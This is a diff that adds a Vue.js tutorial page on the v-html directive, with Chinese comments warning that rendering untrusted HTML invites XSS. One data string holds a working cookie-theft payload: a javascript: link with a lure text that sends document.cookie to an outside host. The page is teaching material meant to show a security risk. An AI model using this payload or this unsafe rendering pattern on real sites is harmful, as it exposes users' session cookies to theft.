@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>v-html指令</title>
+    <!-- 引入Vue -->
+    <script type="text/javascript" src="../js/vue.js"></script>
+</head>
+<body>
+    <!-- 
+        v-html指令：
+            1.作用：向指定节点中渲染包含html结构的内容。
+            2.与插值语法的区别：
+                (1) v-html和v-text一样都会替换掉节点中所有的内容，{{xx}}则不会
+                (2) v-html可以识别html结构。这点v-text就不可以。
+            3.严重注意：v-html有安全性问题
+                (1) 在网站时动态渲染任意HTML是非常危险的，容易导致XSS攻击(跨站脚本攻击)。
+                (2) 一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上！
+    -->
+    <!-- 准备好一个容器 -->
+    <div id="root">       
+        <h2 v-text="str"></h2>    <!-- v-text不会解析标签儿 -->
+        <h2 v-html="str"></h2>    <!-- v-html可以解析html结构 -->
+
+        <!-- v-html 的cookie安全性问题示例 -->
+        <h2 v-html="str2"></h2>
+    </div>
+    <script type="text/javascript">
+        new Vue({
+            el:'#root',
+            data:{               
+                str:'<h2>你好尚硅谷</h2>',
+                // cookie安全性简单示例
+                str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>姐妹我找到你想要的资源了，快来！</a>'
+                                                    // 跳走之后，将cookie参数以query参数传给“坏人的服务器”
+            }
+        })
+    </script>
+    
+</body>
+</html>
